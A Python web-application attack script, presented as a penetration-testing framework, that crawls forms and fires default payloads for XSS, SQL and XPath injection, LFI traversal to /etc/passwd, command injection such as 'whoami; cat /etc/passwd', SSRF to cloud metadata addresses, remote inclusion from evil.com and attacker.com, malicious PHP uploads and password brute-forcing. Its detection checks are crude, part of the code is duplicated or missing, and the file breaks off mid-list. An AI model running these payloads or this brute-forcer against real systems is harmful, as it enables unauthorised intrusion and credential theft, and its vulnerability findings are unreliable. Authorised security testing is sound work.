######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner or manual testing. Note: Be mindful of the scope of work, & rules of engagement, 
# Script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. . By 41ph4-01, and our community. 
# python web_security_framework.py. Requires a linux virtual environment for older python version funtionality, pip restrictions for external dependancies, and reducing conflicts. Dont forget to test each webpage.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace target_url with the specific endpoints you want to test for each vulnerability. 
######################################################################################################################################################################################################################

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, quote, urlencode
import base64
import html

# Banner
def print_banner():
    banner = r"""
    
 __      __        ___.             _____                  .__   .__                  __  .__                       _________                           .__   __                ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
/  \    /  \  ____ \_ |__          /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /_/ __ \ | __ \        /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        / \  ___/ | \_\ \      /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  /   \___  >|___  /______\____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
       \/        \/     \//_____/        \/|__|    |__|                   \/      \/                     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/  

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |
    
    """
    print(banner)
    print("Web Application Security Framework - 41PH4-01 & Our Community\n")

# Log function to keep track of test results
def log_result(test_type, result, message, url, field=None):
    field_info = f" | Field: {field}" if field else ""
    with open("penetration_testing_report.txt", "a") as log_file:
        log_file.write(f"{test_type}: {result} - {message} | URL: {url}{field_info}\n")
    print(f"{test_type}: {result} - {message} | URL: {url}{field_info}")

# Check if link is within the target domain
def is_within_domain(base_url, link):
    base_domain = urlparse(base_url).netloc
    link_domain = urlparse(urljoin(base_url, link)).netloc
    return base_domain == link_domain

# Crawl Website for Forms and Hidden Forms
def crawl_for_forms(url, visited=None):
    if visited is None:
        visited = set()
    if url in visited:
        return []
    visited.add(url)
    print(f"Crawling URL for forms: {url}")
    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        log_result("Crawl", "Error", f"Error crawling {url}: {e}", url)
        return []
    
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    
    form_details_list = []
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        
        form_details = {
            'action': action,
            'method': method,
            'inputs': {input_tag.get('name'): input_tag.get('type', 'text') for input_tag in inputs}
        }
        log_result("Form Found", "Info", str(form_details), url)
        form_details_list.append(form_details)
    
    return form_details_list

# Obfuscate payloads using different methods
def obfuscate_payload(payload):
    return [
        payload,  # Original payload
        base64.b64encode(payload.encode()).decode(),  # Base64 encoding
        quote(payload),  # URL encoding
        html.escape(payload)  # HTML entity encoding
    ]

# Load payloads from file
def load_payloads_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            payloads = [line.strip() for line in file.readlines()]
        return payloads
    except IOError:
        print(f"Error reading file '{file_path}'. Please check the file path and try again.")
        return None

# Generate traversal payloads for various tests
def generate_traversal_payloads(base_payloads, max_levels):
    payloads = []
    for base_payload in base_payloads:
        for i in range(1, max_levels + 1):
            traversal = "../" * i
            payload = traversal + base_payload
            payloads.append(payload)
    return payloads

# LFI Testing for Local File Inclusion
def lfi_test(url, payloads):
    def check_response(response):
        if "root:x:0:0:" in response.text or "boot loader" in response.text or "error" in response.text.lower():
            return True
        return False

    # Test URL parameters for LFI
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                new_query_params = {param: obfuscated_payload for param in param_names}
                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                response = requests.get(new_url)

                if check_response(response):
                    log_result("LFI Test", "Vulnerable", f"LFI vulnerability detected with payload {payload} in URL parameter {param}", url)
                    return

    log_result("LFI Test", "Not Vulnerable", "No LFI vulnerability detected", url)

# XSS Testing for both stored and reflected XSS
def xss_test(url, payloads):
    forms = crawl_for_forms(url)

    def check_response(response, payload):
        if payload in response.text:
            return True
        for header in response.headers.values():
            if payload in header:
                return True
        return False

    # Test URL parameters for XSS
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                new_query_params = {param: obfuscated_payload for param in param_names}
                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                response = requests.get(new_url)

                if check_response(response, payload):
                    log_result("XSS Test", "Vulnerable", f"XSS vulnerability detected with payload {payload} in URL parameter {param}", url)
                    return

    # Test form parameters for XSS
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)

                if check_response(response, payload):
                    log_result("XSS Test", "Vulnerable", f"XSS vulnerability detected with payload {payload}", url, list(inputs.keys()))
                    return
    log_result("XSS Test", "Not Vulnerable", "No XSS vulnerability detected", url)

# SQL Injection Testing for both parameters and headers
def sql_injection_test(url, payloads):
    forms = crawl_for_forms(url)

    def check_response(response):
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            return True
        return False

    # Test URL parameters for SQL Injection
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                new_query_params = {param: obfuscated_payload for param in param_names}
                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                response = requests.get(new_url)

                if check_response(response):
                    log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected with payload {payload} in URL parameter {param}", url)
                    return

    # Test form parameters for SQL Injection
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}

                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)

                if "error" in response.text.lower() or "mysql" in response.text.lower():
                    log_result("SQL Injection Test", "Vulnerable", f"SQL Injection vulnerability detected with payload {payload}", url, list(inputs.keys()))
                    return

    log_result("SQL Injection Test", "Not Vulnerable", "No SQL Injection vulnerability detected", url)

# Blind SQL Injection Testing
def sql_injection_blind_test(url, payloads):
    forms = crawl_for_forms(url)

    def check_response(response):
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            return True
        return False

    # Test URL parameters for Blind SQL Injection
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                new_query_params = {param: obfuscated_payload for param in param_names}
                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                response = requests.get(new_url)

                if check_response(response):
                    log_result("Blind SQL Injection Test", "Vulnerable", f"Blind SQL Injection vulnerability detected with payload {payload} in URL parameter {param}", url)
                    return

    # Test form parameters for Blind SQL Injection
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)

                if "error" in response.text.lower() or "mysql" in response.text.lower():
                    log_result("Blind SQL Injection Test", "Vulnerable", f"Blind SQL Injection vulnerability detected with payload {payload}", url, list(inputs.keys()))
                    return
    log_result("Blind SQL Injection Test", "Not Vulnerable", "No Blind SQL Injection vulnerability detected", url)

# XPATH Injection Testing
def xpath_injection_test(url, payloads):
    forms = crawl_for_forms(url)

    def check_response(response):
        # Check for common XPath errors and indicators of injection success
        xpath_errors = [
            "XPathException", "XPath Error", "invalid or unexpected token",
            "unterminated string", "syntax error", "unclosed token",
            "invalid predicate", "unexpected end of expression",
            "1'='1", "XPath query", "node-set"
        ]
        for error in xpath_errors:
            if error in response.text:
                return True
        return False

    def log_detailed_response(test_type, payload, response, url, param=None, field=None):
        # Log detailed response for further analysis
        field_info = f" | Field: {field}" if field else ""
        param_info = f" | Parameter: {param}" if param else ""
        with open("detailed_xpath_injection_report.txt", "a") as log_file:
            log_file.write(f"{test_type}: Testing payload {payload} {param_info} {field_info} | URL: {url}\n")
            log_file.write(f"Response:\n{response.text}\n")
        print(f"{test_type}: Testing payload {payload} {param_info} {field_info} | URL: {url}")
        print(f"Response:\n{response.text}\n")

    # Test URL parameters for XPath Injection
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                new_query_params = {param: obfuscated_payload for param in param_names}
                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                response = requests.get(new_url)

                log_detailed_response("XPATH Injection Test", obfuscated_payload, response, url, param)
                if check_response(response):
                    log_result("XPATH Injection Test", "Vulnerable", f"XPATH Injection vulnerability detected with payload {payload} in URL parameter {param}", url)
                    return

    # Test form parameters for XPath Injection
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)

                log_detailed_response("XPATH Injection Test", obfuscated_payload, response, url, field=list(inputs.keys()))
                if check_response(response):
                    log_result("XPATH Injection Test", "Vulnerable", f"XPATH Injection vulnerability detected with payload {payload}", url, list(inputs.keys()))
                    return
    log_result("XPATH Injection Test", "Not Vulnerable", "No XPATH Injection vulnerability detected", url)

# Formula Injection Testing
def formula_injection_test(url, payloads):
    forms = crawl_for_forms(url)

    def check_response(response):
        if "FormulaInjection" in response.text or "Spreadsheet" in response.text:
            return True
        return False

    # Test URL parameters for Formula Injection
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                new_query_params = {param: obfuscated_payload for param in param_names}
                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                response = requests.get(new_url)

                if check_response(response):
                    log_result("Formula Injection Test", "Vulnerable", f"Formula Injection vulnerability detected with payload {payload} in URL parameter {param}", url)
                    return

    # Test form parameters for Formula Injection
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)

                if check_response(response):
                    log_result("Formula Injection Test", "Vulnerable", f"Formula Injection vulnerability detected with payload {payload}", url, list(inputs.keys()))
                    return
    log_result("Formula Injection Test", "Not Vulnerable", "No Formula Injection vulnerability detected", url)

# PHP Object Injection Testing
def php_object_injection_test(url, payloads):
    forms = crawl_for_forms(url)

    def check_response(response):
        if "O:8:" in response.text or "unserialize()" in response.text:
            return True
        return False

    # Test URL parameters for PHP Object Injection
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                new_query_params = {param: obfuscated_payload for param in param_names}
                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                response = requests.get(new_url)

                if check_response(response):
                    log_result("PHP Object Injection Test", "Vulnerable", f"PHP Object Injection vulnerability detected with payload {payload} in URL parameter {param}", url)
                    return

    # Test form parameters for PHP Object Injection
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)

                if check_response(response):
                    log_result("PHP Object Injection Test", "Vulnerable", f"PHP Object Injection vulnerability detected with payload {payload}", url, list(inputs.keys()))
                    return
    log_result("PHP Object Injection Test", "Not Vulnerable", "No PHP Object Injection vulnerability detected", url)

# File Uploads Testing (renamed from Unrestricted File Upload)
def file_uploads_test(url):
    forms = crawl_for_forms(url)

    # Example malicious file content
    malicious_file_content = "<?php echo 'Vulnerable'; ?>"

    def check_response(response):
        if "Vulnerable" in response.text:
            return True
        return False

    # File Uploads Testing (continued)
def file_uploads_test(url):
    forms = crawl_for_forms(url)

    # Example malicious file content
    malicious_file_content = "<?php echo 'Vulnerable'; ?>"

    def check_response(response):
        if "Vulnerable" in response.text:
            return True
        return False

    # Test form parameters for File Uploads
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        files = {key: ('malicious.php', malicious_file_content, 'application/php') for key, value in inputs.items() if value == 'file'}
        if method == 'post' and files:
            response = requests.post(urljoin(url, action), files=files)
            if check_response(response):
                log_result("File Uploads Test", "Vulnerable", "File Uploads vulnerability detected", url, list(files.keys()))
                return
    log_result("File Uploads Test", "Not Vulnerable", "No File Uploads vulnerability detected", url)

# DOM Based XSS Testing
def dom_xss_test(url, payloads):
    def check_response(response, payload):
        if payload in response.text:
            return True
        return False

    # Test URL parameters for DOM-Based XSS
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                new_query_params = {param: obfuscated_payload for param in param_names}
                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                response = requests.get(new_url)

                if check_response(response, payload):
                    log_result("DOM XSS Test", "Vulnerable", f"DOM XSS vulnerability detected with payload {payload} in URL parameter {param}", url)
                    return
    log_result("DOM XSS Test", "Not Vulnerable", "No DOM XSS vulnerability detected", url)

# Session Issues Testing
def session_issues_test(url):
    # Example of testing session fixation
    session = requests.Session()
    session_id = "fixed_session_id"

    # Set the session ID
    session.cookies.set("PHPSESSID", session_id)

    response = session.get(url)
    if session_id in response.text:
        log_result("Session Issues Test", "Vulnerable", "Session fixation vulnerability detected", url)
    else:
        log_result("Session Issues Test", "Not Vulnerable", "No session fixation vulnerability detected", url)

# Insecure Direct Object Reference (IDOR) Testing
def idor_test(url, payloads):
    def check_response(response):
        if "Unauthorized" not in response.text:
            return True
        return False

    # Test URL parameters for IDOR
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            new_query_params = {param: payload for param in param_names}
            new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
            response = requests.get(new_url)

            if check_response(response):
                log_result("IDOR Test", "Vulnerable", f"IDOR vulnerability detected with payload {payload} in URL parameter {param}", url)
                return
    log_result("IDOR Test", "Not Vulnerable", "No IDOR vulnerability detected", url)

# Missing Functional Level Access Control Testing
def missing_functional_access_control_test(url):
    # This test would require knowledge of different user roles and endpoints
    # Example: testing an admin endpoint with a regular user session
    regular_user_session = requests.Session()
    admin_endpoint = urljoin(url, "/admin/dashboard")

    response = regular_user_session.get(admin_endpoint)
    if "403 Forbidden" not in response.text:
        log_result("Functional Access Control Test", "Vulnerable", "Access control vulnerability detected", admin_endpoint)
    else:
        log_result("Functional Access Control Test", "Not Vulnerable", "No access control vulnerability detected", admin_endpoint)

# Cross Site Request Forgery (CSRF) Testing
def csrf_test(url):
    forms = crawl_for_forms(url)

    def check_response(response):
        if response.status_code == 200:
            return True
        return False

    # Test form submissions for CSRF protection
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        data = {key: 'test' for key in inputs.keys()}
        if method == 'post':
            response = requests.post(urljoin(url, action), data=data)
            if check_response(response):
                log_result("CSRF Test", "Vulnerable", "CSRF vulnerability detected", url, list(inputs.keys()))
                return
    log_result("CSRF Test", "Not Vulnerable", "No CSRF vulnerability detected", url)

# Cryptography Issues Testing
def cryptography_test(url):
    # Example of weak cryptography test
    weak_encryption_patterns = ["base64", "md5", "sha1"]

    response = requests.get(url)
    for pattern in weak_encryption_patterns:
        if pattern in response.text:
            log_result("Cryptography Test", "Vulnerable", f"Weak cryptography detected: {pattern}", url)
            return
    log_result("Cryptography Test", "Not Vulnerable", "No weak cryptography detected", url)

# Unvalidated Redirects and Forwards Testing
def unvalidated_redirect_test(url, payloads):
    def check_response(response):
        if response.status_code == 302:
            return True
        return False

    # Test URL parameters for unvalidated redirects
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            new_query_params = {param: payload for param in param_names}
            new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
            response = requests.get(new_url, allow_redirects=False)

            if check_response(response):
                log_result("Unvalidated Redirect Test", "Vulnerable", f"Unvalidated redirect detected with payload {payload} in URL parameter {param}", url)
                return
    log_result("Unvalidated Redirect Test", "Not Vulnerable", "No unvalidated redirect detected", url)

# Server Side Template Injection (SSTI) Testing
def ssti_test(url, payloads):
    forms = crawl_for_forms(url)

    def check_response(response):
        if "SSTI" in response.text:
            return True
        return False

    # Test URL parameters for SSTI
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                new_query_params = {param: obfuscated_payload for param in param_names}
                new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
                response = requests.get(new_url)

                if check_response(response):
                    log_result("SSTI Test", "Vulnerable", f"SSTI vulnerability detected with payload {payload} in URL parameter {param}", url)
                    return

    # Test form parameters for SSTI
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for payload in payloads:
            obfuscated_payloads = [payload] + obfuscate_payload(payload)
            for obfuscated_payload in obfuscated_payloads:
                data = {key: obfuscated_payload if value == 'text' else '' for key, value in inputs.items()}
                if method == 'post':
                    response = requests.post(urljoin(url, action), data=data)
                else:
                    response = requests.get(urljoin(url, action), params=data)

                if check_response(response):
                    log_result("SSTI Test", "Vulnerable", f"SSTI vulnerability detected with payload {payload}", url, list(inputs.keys()))
                    return
    log_result("SSTI Test", "Not Vulnerable", "No SSTI vulnerability detected", url)

# Server-Side Request Forgery (SSRF) Testing
def ssrf_test(url, payloads):
    forms = crawl_for_forms(url)

    def check_response(response, payload):
        if payload in response.text:
            return True
        return False

    # Test URL parameters for SSRF
    parsed_url = urlparse(url)
    query_params = parsed_url.query.split('&')
    param_names = [param.split('=')[0] for param in query_params if '=' in param]

    for param in param_names:
        for payload in payloads:
            new_query_params = {param: payload for param in param_names}
            new_url = urljoin(url, f"{parsed_url.path}?{urlencode(new_query_params)}")
            response = requests.get(new_url)

            if check_response(response, payload):
                log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected with payload {payload} in URL parameter {param}", url)
                return

    # Test form parameters for SSRF
    for form in forms:
        action = form['action']
        method = form['method']
        inputs = form['inputs']

        for payload in payloads:
            data = {key: payload if value == 'text' else '' for key, value in inputs.items()}
            if method == 'post':
                response = requests.post(urljoin(url, action), data=data)
            else:
                response = requests.get(urljoin(url, action), params=data)

            if check_response(response, payload):
                log_result("SSRF Test", "Vulnerable", f"SSRF vulnerability detected with payload {payload}", url, list(inputs.keys()))
                return
    log_result("SSRF Test", "Not Vulnerable", "No SSRF vulnerability detected", url)

# Brute Force Testing
def brute_force_test(url, username, wordlist_path):
    with open(wordlist_path, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

    for password in passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if "Login successful" in response.text:
            log_result("Brute Force Test", "Vulnerable", f"Successful login with password: {password}", url)
            return
    log_result("Brute Force Test", "Not Vulnerable", "No valid password found", url)

# Login Function
def login(url, username, password):
    session = requests.Session()
    response = session.post(url, data={'username': username, 'password': password})
    if "Login successful" in response.text:
        return session
    else:
        print("Login failed")
        return None

# API Testing
def api_test(url, method, data):
    if method == 'GET':
        response = requests.get(url, params=data)
    elif method == 'POST':
        response = requests.post(url, data=data)
    else:
        print("Invalid HTTP method")
        return
    
    print(f"Response Code: {response.status_code}")
    print(f"Response Body: {response.text}")

# Generate Report Chart
def generate_report_chart():
    print("Generating report chart...")
    # Implementation for generating a report chart
    # This could involve reading the log file and visualizing the results

# Menu and Submenu system
def display_menu():
    print("\nPenetration Testing Menu:")
    print("1. Crawl Website     2. XSS Testing        3. SQL Injection Testing")
    print("4. SSRF Testing      5. RFI Testing        6. LFI Testing")
    print("7. Command Injection 8. Header Injection   9. Brute Force Testing")
    print("10. Session Handling 11. API Testing       12. Generate Report")
    print("13. Blind SQL Injection 14. XPATH Injection 15. Formula Injection")
    print("16. PHP Object Injection 17. File Uploads   18. DOM XSS")
    print("19. Session Issues 20. IDOR Test 21. Missing Functional Access Control")
    print("22. CSRF Test 23. Cryptography Test 24. Unvalidated Redirect Test")
    print("25. SSTI Test 26. Exit")

def display_payload_menu():
    print("\nPayload Options:")
    print("1. Load payloads from file")
    print("2. Use default payloads")

# Example payloads for XPath Injection
xpath_payloads = [
    "' or '1'='1",
    "\" or \"1\"=\"1",
    "' or '1'='1' or '1'='1",
    "\" or \"1\"=\"1\" or \"1\"=\"1",
    "' or name()='username' or '1'='1",
    "\" or name()='password' or \"1\"=\"1",
    "' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1' or '1'='1'",
    "\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\" or \"1\"=\"1\"",
    "' or count(/*)=1 or '1'='1",
    "\" or count(/*)=1 or \"1\"=\"1",
    "' or //user/*[1]='",
    "\" or //user/*[1]=\"",
    "' or 1=1 or '1'='",
    "\" or 1=1 or \"1\"=\"",
    "admin' and '1'='1",
    "admin' or '1'='1",
    "admin' and count(//user) > 0 and '1'='1",
    "admin' or count(//user) > 0 or '1'='1",
    "' and substring(name(/*),1,1)='a",
    "' or substring(name(/*),1,1)='a",
    "' and count(//*[text()='username']) > 0 and '1'='1",
    "\" and count(//*[text()='username']) > 0 and \"1\"=\"1",
    "%27%20or%20%271%27=%271",  # URL-encoded single quote injection
    "%22%20or%20%221%22=%221",  # URL-encoded double quote injection
    "'%20or%20'1'%3D'1",        # Partially encoded single quote injection
    "\"%20or%20\"1\"%3D\"1"     # Partially encoded double quote injection
]

# Update the handle_menu_choice function to use these payloads for XPath Injection
def handle_menu_choice(choice):
    target_url = input("Enter target URL: ")
    payloads = []

    if choice in [2, 3, 4, 5, 6, 7, 8, 13, 14, 15, 16, 18, 20, 24, 25]:
        display_payload_menu()
        payload_choice = int(input("Enter your choice: "))
        if payload_choice == 1:
            while True:
                file_path = input("Enter the path to the payload file: ")
                payloads = load_payloads_from_file(file_path)
                if payloads is not None:
                    break
        else:
            if choice == 2:
                payloads = [
                    "<script>alert('XSS');</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<body onload=alert('XSS')>",
                    "<svg/onload=alert('XSS')>",
                    "\";alert('XSS');//",
                    "';alert('XSS');",
                    "<iframe src=javascript:alert('XSS')>",
                    "<math><mi><mo><mtext><mn><ms><mtext><mglyph><malignmark><maligngroup><ms><mtext>&lt;script&gt;alert('XSS')&lt;/script&gt;</mtext></ms></maligngroup></malignmark></mglyph></mn></mtext></mo></mi></math>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                ]
            elif choice == 3:
                payloads = [
                    "' OR '1'='1",
                    "' OR '1'='1' --",
                    "' OR '1'='1' /*",
                    "' OR 1=1 --"
                ]
            elif choice == 4:
                payloads = [
                    "http://localhost:8080",
                    "http://127.0.0.1:8080",
                    "http://169.254.169.254"
                ]
            elif choice == 5:
                payloads = [
                    "http://example.com/malicious_file",
                    "http://evil.com/evil_script",
                    "http://attacker.com/backdoor"
                ]
            elif choice == 6:
                base_path = "etc/passwd"
                max_levels = 10
                payloads = generate_traversal_payloads([base_path], max_levels)
            elif choice == 7:
                base_paths = ["id; ls", "whoami; cat /etc/passwd", "uname -a; ls -la", "`id`", "$(id)", "`uname -a`", "&& whoami", "|| uname -a", "| id", ";& id", "|& id", "%0A id", "%0A uname -a"]
                max_levels = 3
                payloads = generate_traversal_payloads(base_paths, max_levels)
            elif choice == 8:
                payloads = [
                    "\r\nX-Test: injected-header",
                    "\nX-Test: injected-header",
                    "%0d%0aX-Test: injected-header",
